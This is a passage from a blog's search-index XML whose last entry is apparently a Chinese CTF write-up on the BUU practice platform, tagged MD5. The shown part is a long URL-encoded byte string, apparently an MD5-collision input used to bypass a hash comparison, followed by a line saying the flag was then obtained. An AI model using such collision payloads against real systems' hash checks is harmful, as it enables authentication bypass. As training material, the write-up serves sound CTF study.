class="hljs-string">&quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%ed%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%a7%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%e6%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%16%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%33%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%6f%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&quot;</span><br></code></pre></td></tr></table></figure></p><p>然后就顺利得到flag啦~</p>]]></content>
    
    
    <categories>
      
      <category>BUU刷题记录</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>MD5</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
